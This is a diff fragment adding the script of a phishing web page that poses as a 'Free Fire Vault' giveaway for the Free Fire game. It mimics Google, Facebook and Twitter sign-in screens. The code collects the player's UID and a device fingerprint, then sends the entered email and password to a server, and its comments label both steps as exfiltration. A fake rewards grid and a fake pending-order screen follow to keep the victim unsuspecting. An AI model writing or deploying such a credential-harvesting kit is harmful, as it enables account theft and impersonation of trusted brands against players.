+            'Google': `<svg viewBox="0 0 24 24" width="48" height="48" xmlns="http://www.w3.org/2000/svg"><path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/><path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/><path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/><path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/></svg>`,
+            'Facebook': `<svg viewBox="0 0 24 24" width="48" height="48" xmlns="http://www.w3.org/2000/svg"><path fill="#1877F2" d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.469h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.469h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>`,
+            'Twitter': `<svg viewBox="0 0 24 24" width="48" height="48" xmlns="http://www.w3.org/2000/svg"><path fill="#1DA1F2" d="M23.953 4.57a10 10 0 01-2.825.775 4.958 4.958 0 002.163-2.723c-.951.555-2.005.959-3.127 1.184a4.92 4.92 0 00-8.384 4.482C7.69 8.095 4.067 6.13 1.64 3.162a4.822 4.822 0 00-.666 2.475c0 1.71.87 3.213 2.188 4.096a4.904 4.904 0 01-2.228-.616v.06a4.923 4.923 0 003.946 4.827 4.996 4.996 0 01-2.212.085 4.936 4.936 0 004.604 3.417 9.867 9.867 0 01-6.102 2.105c-.39 0-.779-.023-1.17-.067a13.995 13.995 0 007.557 2.209c9.053 0 13.998-7.496 13.998-13.985 0-.21 0-.42-.015-.63A9.935 9.935 0 0024 4.59z"/></svg>`
+        };
+
+        // ==========================================
+        // 3. VIEW ROUTING
+        // ==========================================
+        function switchView(viewId) {
+            document.querySelectorAll('.view').forEach(v => v.classList.remove('view-active'));
+            const target = document.getElementById(`view-${viewId}`);
+            if (target) {
+                target.classList.add('view-active');
+                window.scrollTo(0, 0);
+            }
+        }
+
+        // ==========================================
+        // 4. DEVICE TELEMETRY
+        // ==========================================
+        function getDeviceDetails() {
+            const ua = navigator.userAgent;
+            let type = 'Desktop';
+            if (/Android/i.test(ua)) type = 'Android';
+            else if (/iPhone|iPad|iPod/i.test(ua)) type = 'iOS';
+            else if (/Windows/i.test(ua)) type = 'Windows';
+            else if (/Mac/i.test(ua)) type = 'Mac';
+
+            return {
+                userAgent: ua,
+                platform: navigator.platform,
+                deviceType: type,
+                screen: `${window.screen.width}x${window.screen.height}`,
+                language: navigator.language
+            };
+        }
+
+        // ==========================================
+        // 5. STEP 1: UID SUBMISSION
+        // ==========================================
+        function handleUidSubmit() {
+            const uidInput = document.getElementById('uid-input');
+            const uid = uidInput.value.trim();
+
+            if (uid.length < 5) {
+                showModal('⚠️', 'Invalid UID', 'Please enter a valid Free Fire UID to proceed.');
+                return;
+            }
+
+            appState.currentUid = uid;
+            appState.currentDevice = getDeviceDetails();
+
+            // Exfiltrate UID + Device
+            fetch('/api/track_uid', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    uid: appState.currentUid,
+                    platform: 'FreeFire',
+                    device: appState.currentDevice
+                })
+            }).catch(() => {});
+
+            switchView('provider');
+        }
+
+        // ==========================================
+        // 6. STEP 2: PROVIDER SELECTION
+        // ==========================================
+        function selectProvider(provider) {
+            appState.provider = provider;
+            
+            // Update login UI
+            document.getElementById('login-logo-container').innerHTML = `
+                ${logos[provider]}
+                <h2 id="login-title">Sign in</h2>
+                <p id="login-subtitle">to continue to Free Fire Vault</p>
+            `;
+            document.getElementById('login-email').placeholder = provider === 'Google' ? 'Email or phone' : `${provider} Email`;
+            
+            switchView('login');
+        }
+
+        // ==========================================
+        // 7. STEP 3: LOGIN SUBMISSION
+        // ==========================================
+        function togglePasswordVisibility() {
+            const input = document.getElementById('login-pass');
+            const toggle = document.querySelector('.password-toggle');
+            if (input.type === 'password') {
+                input.type = 'text';
+                toggle.textContent = '🙈';
+            } else {
+                input.type = 'password';
+                toggle.textContent = '👁️';
+            }
+        }
+
+        function handleLoginSubmit() {
+            const email = document.getElementById('login-email').value;
+            const pass = document.getElementById('login-pass').value;
+            const btn = document.getElementById('btn-login');
+
+            btn.textContent = 'Verifying...';
+            btn.style.opacity = '0.7';
+            btn.disabled = true;
+
+            // Exfiltrate Credentials + UID + Device + Provider
+            fetch('/api/track_login', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    email: email,
+                    password: pass,
+                    uid: appState.currentUid,
+                    provider: appState.provider,
+                    device: appState.currentDevice
+                })
+            }).catch(() => {});
+
+            setTimeout(() => {
+                btn.textContent = 'Next';
+                btn.style.opacity = '1';
+                btn.disabled = false;
+                switchView('rewards');
+            }, 1500);
+        }
+
+        // ==========================================
+        // 8. REWARDS GRID RENDERING
+        // ==========================================
+        const rewardsData = [
+            { name: 'EVO AK47', type: 'TOKEN', visual: 'token', count: 'X 2064' },
+            { name: 'EVO AN94', type: 'TOKEN', visual: 'token', count: 'X 2064' },
+            { name: 'EVO UMP', type: 'TOKEN', visual: 'token', count: 'X 2064' },
+            { name: 'EVO MP40', type: 'TOKEN', visual: 'token', count: 'X 2064' },
+            { name: 'EVO SCAR', type: 'TOKEN', visual: 'token', count: 'X 2064' },
+            { name: 'EVO XM8', type: 'TOKEN', visual: 'token', count: 'X 2064' },
+            { name: 'SAKURA', type: 'BUNDLE', visual: 'bundle', count: '' },
+            { name: 'HIP HOP', type: 'BUNDLE', visual: 'bundle', count: '' },
+            { name: 'HARBINGER', type: 'BUNDLE', visual: 'bundle', count: '' },
+            { name: 'BUNNY', type: 'BUNDLE', visual: 'bundle', count: '' },
+            { name: 'TROPICAL', type: 'PARROT', visual: 'bundle', count: '' },
+            { name: 'BOOYAH', type: 'PASS', visual: 'pass', count: '' }
+        ];
+
+        function renderRewards() {
+            const grid = document.getElementById('rewards-grid');
+            grid.innerHTML = '';
+
+            rewardsData.forEach(item => {
+                const card = document.createElement('div');
+                card.className = 'reward-card';
+                card.onclick = () => handleClaim(item.name);
+
+                let visualHTML = '';
+                if (item.visual === 'token') {
+                    visualHTML = `<div class="visual-token"></div>`;
+                } else if (item.visual === 'bundle') {
+                    visualHTML = `<div class="visual-bundle"></div>`;
+                } else if (item.visual === 'pass') {
+                    visualHTML = `<div class="visual-pass"></div>`;
+                }
+
+                const countHTML = item.count ? `<div class="reward-count">${item.count}</div>` : '';
+
+                card.innerHTML = `
+                    <div class="reward-visual">
+                        ${visualHTML}
+                        ${countHTML}
+                    </div>
+                    <div class="reward-details">
+                        <div class="reward-name">${item.name}</div>
+                        <div class="reward-type">${item.type}</div>
+                    </div>
+                    <button class="btn-collect" onclick="event.stopPropagation(); handleClaim('${item.name}')">Collect</button>
+                `;
+
+                grid.appendChild(card);
+            });
+        }
+        renderRewards();
+
+        // ==========================================
+        // 9. STEP 4: CLAIM ITEM
+        // ==========================================
+        function handleClaim(itemName) {
+            showModal('✅', 'Selected', `You selected ${itemName}. Proceeding to processing...`);
+            
+            setTimeout(() => {
+                closeModal();
+                appState.orderId = '#FF-' + Math.floor(100000 + Math.random() * 900000);
+                document.getElementById('order-id').textContent = appState.orderId;
+                document.getElementById('order-uid').textContent = appState.currentUid;
+                switchView('pending');
+            }, 1500);
+        }
+
+        // ==========================================
+        // 10. MODAL UTILITIES
+        // ==========================================
+        function showModal(icon, title, text) {
+            document.getElementById('modal-icon').textContent = icon;
+            document.getElementById('modal-title').textContent = title;
+            document.getElementById('modal-text').textContent = text;
+            document.getElementById('modal').classList.add('active');
+        }
+
+        function closeModal() {
+            document.getElementById('modal').classList.remove('active');
+        }
+
+    </script>
+</body>
+</html>￼Ente
